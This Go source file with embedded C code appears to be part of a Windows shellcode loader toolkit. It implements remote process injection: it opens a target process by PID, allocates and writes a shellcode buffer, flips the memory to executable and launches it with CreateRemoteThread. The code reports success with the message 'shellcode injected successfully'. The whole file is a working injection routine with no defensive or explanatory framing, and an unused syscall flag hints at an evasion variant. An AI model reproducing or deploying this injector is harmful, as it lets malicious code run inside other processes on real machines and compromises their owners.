//go:build windows && amd64 && cgo

package loader

/*
#cgo CFLAGS: -O2
#include <windows.h>

int inject_shellcode(int pid, unsigned char* shellcode, int shellcodeLen, int useSyscall) {
    (void)useSyscall;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pid);
    if (!hProcess) return -1;

    SIZE_T allocSize = (SIZE_T)shellcodeLen;
    LPVOID remoteAddr = VirtualAllocEx(hProcess, NULL, allocSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteAddr) {
        CloseHandle(hProcess);
        return -2;
    }

    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(hProcess, remoteAddr, shellcode, (SIZE_T)shellcodeLen, &bytesWritten)) {
        VirtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return -3;
    }

    DWORD oldProtect;
    if (!VirtualProtectEx(hProcess, remoteAddr, allocSize, PAGE_EXECUTE_READ, &oldProtect)) {
        VirtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return -4;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)remoteAddr, NULL, 0, NULL);
    if (!hThread) {
        VirtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return -5;
    }

    CloseHandle(hThread);
    CloseHandle(hProcess);
    return 0;
}
*/
import "C"

import (
	"fmt"
	"unsafe"
)

// injectViaWindowsAPI 使用标准 Windows API 执行注入（无绕过）。
func injectViaWindowsAPI(cfg *LoadConfig) *LoadResult {
	if cfg.PID <= 0 || len(cfg.Shellcode) == 0 {
		return &LoadResult{
			Success: false,
			Message: "invalid pid or empty shellcode",
		}
	}

	ret := C.inject_shellcode(
		C.int(cfg.PID),
		(*C.uchar)(unsafe.Pointer(&cfg.Shellcode[0])),
		C.int(len(cfg.Shellcode)),
		0,
	)

	if ret != 0 {
		return &LoadResult{
			Success: false,
			Message: fmt.Sprintf("inject failed: code=%d", int(ret)),
		}
	}

	return &LoadResult{
		Success: true,
		Message: "shellcode injected successfully",
	}
}
